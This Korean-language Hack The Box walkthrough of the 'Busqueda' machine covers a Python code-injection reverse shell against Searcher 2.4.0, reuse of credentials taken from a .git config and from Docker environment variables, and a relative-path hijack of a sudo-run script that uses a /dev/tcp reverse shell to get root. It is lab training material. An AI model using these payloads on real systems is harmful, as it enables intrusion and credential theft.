---
tags:
  - type/machine
  - platform/htb
  - os/linux
  - status/solved
  - tech/lin/path-hijack
  - tech/payload/revshell
type: machine
platform: htb
os: linux
ip: 10.129.228.217
domain: searcher.htb
ports: [22, 80]
services: [http, ssh]
status: solved
tech_count: 2
---
## Nmap

```bash
┌──(kali㉿kali)-[~/HTB/Busqueda]
└─$ nnmap 10.129.228.217
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 16:50 +0900
Nmap scan report for 10.129.228.217
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   270.19 ms 10.10.14.1
2   270.51 ms 10.129.228.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.32 seconds

```

웹페이지 접속 후 Searcher 2.4.0 서비스 사용중

리버스쉘 연결하는 POC 실행
```html
POST /search HTTP/1.1

Host: searcher.htb

Content-Length: 28

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Origin: http://searcher.htb

Content-Type: application/x-www-form-urlencoded

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://searcher.htb/

Accept-Encoding: gzip, deflate, br

Connection: keep-alive



engine=Accuweather&query=A5',+exec("import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(('10.10.14.42',80))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(['/bin/sh','-i'])%3b"))%23
```

리버스쉘 연결 성공
```bash
┌──(kali㉿kali)-[~/HTB/Busqueda]
└─$ rlwrap nc -lnvp 80  
listening on [any] 80 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.228.217] 33004
/bin/sh: 0: can't access tty; job control turned off
$ 

```

user.txt 획득
```bash
$ cd /home/svc
$ ls
user.txt
$ cat user.txt
d034bbfae7a0fb289c37114437f5eaac
$ ifconfig
br-c954bf22b8b2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255
        ether 02:42:0c:aa:df:7c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

br-cbf2c5ce8e95: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
        inet6 fe80::42:afff:fe69:91a  prefixlen 64  scopeid 0x20<link>
        ether 02:42:af:69:09:1a  txqueuelen 0  (Ethernet)
        RX packets 105  bytes 12242 (12.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 108  bytes 27001 (27.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

br-fba5a3e31476: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:c5:08:23:45  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:37:94:9d:09  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.228.217  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe94:fbe6  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:fbe6  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:fb:e6  txqueuelen 1000  (Ethernet)
        RX packets 69935  bytes 4228619 (4.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 68844  bytes 3771823 (3.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

`searcher.htb` 검색하여 관련된 문자열 검색
`cody/jh1usoih2bkjaspwe92`획득
```bash
$ grep -ir 'searcher.htb' .
./templates/index.html:            <p class="copyright">searcher.htb © 2023</p>
./.git/logs/HEAD:0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000        commit (initial): Initial commit
./.git/logs/refs/heads/main:0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000     commit (initial): Initial commit
./.git/logs/refs/remotes/origin/main:0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000    update by push
./.git/config:  url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git

```

SSH로 접속
```bash
┌──(kali㉿kali)-[~/HTB/Busqueda]
└─$ ssh svc@10.129.228.217                        
The authenticity of host '10.129.228.217 (10.129.228.217)' can't be established.
ED25519 key fingerprint is: SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.217' (ED25519) to the list of known hosts.
svc@10.129.228.217's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 18 08:02:20 AM UTC 2026

  System load:                      0.04150390625
  Usage of /:                       80.2% of 8.26GB
  Memory usage:                     48%
  Swap usage:                       0%
  Processes:                        232
  Users logged in:                  0
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.228.217
  IPv6 address for eth0:            dead:beef::250:56ff:fe94:fbe6


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
svc@busqueda:~$ 

```

sudo 권한 확인
```bash
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

```

system-checkup.py 내용 확인
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

```

두 개의 컨테이너 gitea, mysql_db 실행 중 확인
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 14 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 14 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

```

`yuiu1hoiu4i5ho1uh` 패스워드 획득
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db | jq .
{
  "Hostname": "f84a6b33fb5a",
  "Domainname": "",
  "User": "",
  "AttachStdin": false,
  "AttachStdout": false,
  "AttachStderr": false,
  "ExposedPorts": {
    "3306/tcp": {},
    "33060/tcp": {}
  },
  "Tty": false,
  "OpenStdin": false,
  "StdinOnce": false,
  "Env": [
    "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
    "MYSQL_USER=gitea",
    "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
    "MYSQL_DATABASE=gitea",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "GOSU_VERSION=1.14",
    "MYSQL_MAJOR=8.0",
    "MYSQL_VERSION=8.0.31-1.el8",
    "MYSQL_SHELL_VERSION=8.0.31-1.el8"
  ],
  "Cmd": [
    "mysqld"
  ],
  "Image": "mysql:8",
  "Volumes": {
    "/var/lib/mysql": {}
  },
  "WorkingDir": "",
  "Entrypoint": [
    "docker-entrypoint.sh"
  ],
  "OnBuild": null,
  "Labels": {
    "com.docker.compose.config-hash": "1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b",
    "com.docker.compose.container-number": "1",
    "com.docker.compose.oneoff": "False",
    "com.docker.compose.project": "docker",
    "com.docker.compose.project.config_files": "docker-compose.yml",
    "com.docker.compose.project.working_dir": "/root/scripts/docker",
    "com.docker.compose.service": "db",
    "com.docker.compose.version": "1.29.2"
  }
}

```

Gitea의 administrator/scripts/full-checkup.sh 파일 분석 결과, full-checkup 인자 사용 시 상대 경로(./full-checkup.sh)로 스크립트가 실행되고 있음

```python
#!/bin/bash
import subprocessimport sys actions = ['full-checkup', 'docker-ps','docker-inspect'] def run_command(arg_list): r = subprocess.run(arg_list, capture_output=True) if r.stderr: output = r.stderr.decode() else: output = r.stdout.decode() return output def process_action(action): if action == 'docker-inspect': try: _format = sys.argv[2] if len(_format) == 0: print(f"Format can't be empty") exit(1) container = sys.argv[3] arg_list = ['docker', 'inspect', '--format', _format, container] print(run_command(arg_list)) except IndexError: print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>") exit(1) except Exception as e: print('Something went wrong') exit(1) elif action == 'docker-ps': try: arg_list = ['docker', 'ps'] print(run_command(arg_list)) except: print('Something went wrong') exit(1) elif action == 'full-checkup': try: arg_list = ['./full-checkup.sh'] print(run_command(arg_list)) print('[+] Done!') except: print('Something went wrong') exit(1)
```

리버스쉘 명령 실행하는 full-checkup.sh 스크립트 파일 생성
```bash
svc@busqueda:/tmp$ vi full-checkup.sh
svc@busqueda:/tmp$ cat full-checkup.sh
#! /bin/bash
/bin/bash -c 'sh -i >& /dev/tcp/10.10.42.248/4444 0>&1'
svc@busqueda:/tmp$ chmod 744 full-checkup.sh 
```

리버스쉘 연결 성공
```bash
┌──(kali㉿kali)-[~/HTB/Busqueda]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.228.217] 46022
# whoami
root

```


root.txt 획득
![[Pasted image 20260318171237.png]]

```bash
┌──(kali㉿kali)-[~/HTB/Busqueda]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.228.217] 46022
# whoami
root
# cat /root/root.txt
13bd00d465ba3d72a806800221e0d6ca
# ifconfig
br-c954bf22b8b2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255
        ether 02:42:0c:aa:df:7c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

br-cbf2c5ce8e95: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
        inet6 fe80::42:afff:fe69:91a  prefixlen 64  scopeid 0x20<link>
        ether 02:42:af:69:09:1a  txqueuelen 0  (Ethernet)
        RX packets 329  bytes 37550 (37.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 314  bytes 79995 (79.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

br-fba5a3e31476: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:c5:08:23:45  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:37:94:9d:09  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.228.217  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe94:fbe6  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:fbe6  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:fb:e6  txqueuelen 1000  (Ethernet)
        RX packets 72197  bytes 4405934 (4.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 69651  bytes 3886031 (3.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```